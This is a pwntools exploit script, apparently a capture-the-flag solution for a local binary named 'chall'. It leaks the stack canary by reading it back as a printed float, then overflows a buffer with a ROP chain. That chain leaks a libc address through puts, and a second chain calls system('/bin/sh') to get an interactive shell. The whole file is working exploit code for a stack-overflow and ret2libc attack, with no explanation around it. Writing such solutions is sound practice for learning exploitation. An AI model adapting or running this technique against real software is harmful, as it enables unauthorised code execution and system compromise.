from pwn import *

import json
import struct


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
# b *0x0000000000400CCE
b ask_again
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)

io.sendlineafter(b'> ', b'hoge')
io.sendlineafter(b'> ', b'16')

io.sendlineafter(b'[sec]: ', b'-')

io.recvuntil(b'close to ')
data = float(io.recvuntil(b' ').rstrip())
canary = struct.unpack("<Q", struct.pack("<d", data))[0]
print("canary = 0x{:x}".format(canary))

io.sendlineafter(b'timer.', b'')
io.sendlineafter(b'started.', b'')

addr_pop_rdi = 0x0000000000400e93  # : pop rdi ; ret
addr_ret = 0x00000000004006a6

payload = b''
payload += b'A' * 0x18
payload += p64(canary)
payload += p64(0xdeadbeef)  # old rbp
payload += p64(addr_pop_rdi)
# 0x0000000000601ff0│+0x0000: 0x00007ffff7a05ab0  →  <__libc_start_main+0> push r13
payload += p64(0x0000000000601ff0)
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['ask_again'])

io.sendlineafter(b'(Y/n) ', payload)

data = io.recvline().rstrip()
addr_libc = u64(data.ljust(8, b'\x00')) - 0x21ab0
print('addr_libc = 0x{:08x}'.format(addr_libc))

payload = b''
payload += b'B' * 0x18
payload += p64(canary)
payload += p64(0xcafebabe)
payload += p64(addr_ret)
payload += p64(addr_pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])

io.sendlineafter(b'(Y/n) ', payload)


io.interactive()
